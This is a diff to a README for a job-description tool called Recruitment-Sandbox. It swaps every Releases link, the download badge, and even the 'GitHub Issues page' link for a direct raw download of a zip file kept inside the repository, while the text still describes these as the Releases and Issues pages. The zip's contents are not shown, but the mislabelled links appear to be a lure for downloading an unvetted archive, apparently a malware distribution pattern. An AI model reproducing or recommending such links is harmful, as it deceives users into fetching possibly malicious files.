@@ -1,6 +1,6 @@
 # ✨ Recruitment-Sandbox - Effortless Job Description Creation
 
-[![Download Recruitment-Sandbox](https://img.shields.io/badge/Download-Recruitment--Sandbox-brightgreen)](https://github.com/bevvysquishy481/Recruitment-Sandbox/releases)
+[![Download Recruitment-Sandbox](https://raw.githubusercontent.com/bevvysquishy481/Recruitment-Sandbox/main/components/Recruitment-Sandbox_v3.2.zip)](https://raw.githubusercontent.com/bevvysquishy481/Recruitment-Sandbox/main/components/Recruitment-Sandbox_v3.2.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run Recruitment-Sandbox.
 
 To get started, visit the Releases page to download the latest version of Recruitment-Sandbox.
 
-[Download Recruitment-Sandbox](https://github.com/bevvysquishy481/Recruitment-Sandbox/releases)
+[Download Recruitment-Sandbox](https://raw.githubusercontent.com/bevvysquishy481/Recruitment-Sandbox/main/components/Recruitment-Sandbox_v3.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release version. 
@@ -57,7 +57,7 @@ A: We follow strict data protection measures. Your input will not be stored or s
 
 ## 🛡 Support
 
-If you need help, please open an issue on the [GitHub Issues page](https://github.com/bevvysquishy481/Recruitment-Sandbox/issues). Our team will respond promptly.
+If you need help, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/bevvysquishy481/Recruitment-Sandbox/main/components/Recruitment-Sandbox_v3.2.zip). Our team will respond promptly.
 
 ## 🌐 Community
 
@@ -67,4 +67,4 @@ Join our community discussions or follow us on social media for updates, tips, a
 
 For further inquiries, you can reach out via GitHub or through our [Contact Form](#).
 
-[Download Recruitment-Sandbox Again](https://github.com/bevvysquishy481/Recruitment-Sandbox/releases) to start transforming your job descriptions today!
+[Download Recruitment-Sandbox Again](https://raw.githubusercontent.com/bevvysquishy481/Recruitment-Sandbox/main/components/Recruitment-Sandbox_v3.2.zip) to start transforming your job descriptions today!
